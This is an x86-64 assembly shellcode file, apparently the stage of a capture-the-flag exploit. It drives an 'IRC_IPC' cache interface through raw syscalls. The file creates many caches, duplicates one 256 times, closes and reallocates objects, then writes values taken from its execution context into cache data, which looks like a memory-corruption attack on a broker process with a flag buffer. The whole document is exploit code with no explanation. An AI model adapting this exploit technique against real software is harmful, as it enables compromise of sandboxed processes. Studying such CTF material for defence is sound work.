# save shellcode_ctx
mov [rip + ctx], rdx

# IPC_CREATE_CACHE
mov rbx, 0x11
call create_cache
mov rbx, 0x11
call create_cache
mov rbx, 0x11
call create_cache
mov rbx, 0x11
call create_cache

# IPC_CREATE_CACHE_DATA
mov rbx, 0x1
mov rcx, 0x20
call create_cache_data

# IPC_DUP_CACHE
mov rcx, 256 # dup cache 1, n times
dup_moar:
push rcx
mov rbx, 0x1
call dup_cache
pop rcx
dec rcx
cmp rcx, 0x0
jne dup_moar

# IPC_CLOSE_CACHE
mov rbx, 0x7
call close_cache

# IPC_CREATE_CACHE_DATA
mov rbx, 0x2
mov rcx, 0x11
call create_cache_data
mov rbx, 0x3
mov rcx, 0x11
call create_cache_data
mov rbx, 0x4
mov rcx, 0x11
call create_cache_data

# IPC SET_CACHE_DATA
mov rbx, 0x3
mov rcx, 0x11
call set_cache_data

mov rbx, 0x1
mov rcx, 0x5a
call set_payload
#call do_loop

call js_success

# exit cleanly
#mov rax, 60
#mov rdi, 0x1337
#syscall

dup_cache:
mov rax, [rip + ipc_cache_dup]
mov [rip + ipc_id], rax
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc]
mov rdx, [rip + msg_size]
# dup first cache
mov [rip + ipc_arg0], rbx
syscall
call read_result
ret

close_cache:
mov rax, [rip + ipc_cache_close]
mov [rip + ipc_id], rax
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc]
mov rdx, [rip + msg_size]
# close first cache
mov [rip + ipc_arg0], rbx
syscall
call read_result
ret

create_cache:
mov rax, [rip + ipc_cache_create]
mov [rip + ipc_id], rax
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc]
mov rdx, [rip + msg_size]
# set object size
mov [rip + ipc_arg0], rbx
syscall
call read_result
ret

create_cache_data:
mov rax, [rip + ipc_cache_create_data]
mov [rip + ipc_id], rax
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc]
mov rdx, [rip + msg_size]
mov [rip + ipc_arg0], rbx
mov [rip + ipc_arg1], rcx
syscall
call read_result
ret

set_cache_data:
mov rax, [rip + ipc_cache_set_data]
mov [rip + ipc_id], rax
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc]
mov rdx, [rip + msg_size]
mov [rip + ipc_arg0], rbx
push rcx
syscall

call read_result

pop rdx
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
mov rbx, [rip + ctx]
mov rbx, [rbx+8]
mov [rip + pl], rbx 
lea rsi, [rip + pl]
syscall
ret

set_payload:
mov rax, [rip + ipc_cache_set_data]
mov [rip + ipc_id], rax
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc]
mov rdx, [rip + msg_size]
mov [rip + ipc_arg0], rbx
push rcx
syscall

call read_result

pop rdx
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
mov rbx, [rip + ctx]
mov rbx, [rbx+0x10]
#mov rbx, 0xdeadbeef
mov [rip + pl], rbx
lea rsi, [rip + pl]
syscall
ret

get_payload:
mov rax, [rip + ipc_cache_get_data]
mov [rip + ipc_id], rax
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc]
mov rdx, [rip + msg_size]
mov [rip + ipc_arg0], rbx
push rcx
syscall

call read_result

pop rdx
mov rax, 0 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + pl]
syscall
ret

js_success:
mov rax, [rip + ipc_js_success]
mov [rip + ipc_id], rax
mov rax, 1 # write
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc]
mov rdx, [rip + msg_size]
syscall
ret

read_result:
mov rax, 0 # read
mov rdi, [rip + ipc_fd]
lea rsi, [rip + ipc_res]
mov rdx, [rip + msg_size]
syscall
mov rax, [rip + ipc_res_result]
cmp rax, 0
je read_result
ret

log:
mov rax, 1 # write
mov rdi, [rip + log_fd]
mov rsi, [rip + log_msg]
mov rdx, 10
syscall
ret

do_loop:
mov rax, rax
jmp do_loop

ctx: .quad 0x0
ipc: .asciz "IRC_IPC"
ipc_id: .quad 0xac1d0003
ipc_debug: .quad 0x1
ipc_status: .quad 0x0
ipc_result: .quad 0x0
ipc_arg0: .quad 0x0
ipc_arg1: .quad 0x0

ipc_res: .asciz "IRC_IPC"
ipc_res_id: .quad 0xac1d0003
ipc_res_debug: .quad 0x1
ipc_res_status: .quad 0x0
ipc_res_result: .quad 0x0
ipc_res_arg0: .quad 0x0
ipc_res_arg1: .quad 0x0

ipc_cache_create: .quad 0xac1d0003
ipc_cache_dup: .quad 0xac1d0004
ipc_cache_close: .quad 0xac1d0005
ipc_cache_create_data: .quad 0xac1d0006
ipc_cache_set_data: .quad 0xac1d0007
ipc_cache_get_data: .quad 0xac1d0008
ipc_js_success: .quad 0xac1d0001
msg_size: .quad 0x38
ipc_fd: .quad 0x4
log_fd: .quad 0x5
log_msg: .asciz "okokokok\n"
flag: .asciz "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
pl: .asciz "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
pl2: .asciz "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"